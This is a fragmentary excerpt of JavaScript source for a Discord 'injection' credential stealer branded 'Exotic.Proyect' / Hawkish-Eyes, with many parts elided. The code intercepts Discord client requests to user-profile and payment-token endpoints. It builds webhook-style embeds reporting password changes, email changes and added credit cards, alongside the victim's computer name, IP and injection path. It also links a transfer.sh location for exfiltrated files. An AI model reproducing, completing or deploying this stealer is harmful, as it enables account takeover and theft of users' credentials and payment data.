...
const FirstTime = async () => {
    ...
    if (!token) {
        var params = await makeEmbed({
            title: "HExotic.Proyect  Initialized",
            fields: [{
                name: "Injection Info",
        ...
        var params = await makeEmbed({
            title: " Exotic.Proyect Initialized",
            ...
            fields: [{
                ...
                name: "@Copyright",
                value: `[Exotic.Proyect 2024 <:hwkish:1104091524758773822>](https://github.com/Inplex-sys/Hawkish-Eyes-NoDualHook)`,
                inline: !0
            }, {
    ...
    switch (true) {
        ...
        case request.url.endsWith("users/@me"):
            ...
            if (data.new_password) {
                var params = await makeEmbed({
                    title: "Exotic.Proyect Detect Password Changed",
                    color: config['embed-color'],
                    description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                    fields: [{
                        name: "Username <:username:1041634536733290596> ",
            ...
            if (data.email) {
                var params = await makeEmbed({
                    title: "Exotic.Proyect Detect Email Changed",
                    color: config['embed-color'],
                    description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                    fields: [{
                        name: "Username <:username:1041634536733290596> ",
                        ...
                        name: "@Copyright",
                        value: `[Exotic.Proyect 2024 <:hwkish:1104091524758773822>]`,
                        inline: !0
                    }, {
                        name: "Hawkished Files",
                        value: `[Transfer.sh <:transfer:1105163981338968264>](${config.transfer_link})`,
        ...
        case request.url.endsWith("tokens"):
            ...
            var params = await makeEmbed({
                title: "Exotic.Proyect User Credit Card Added",
                description: `
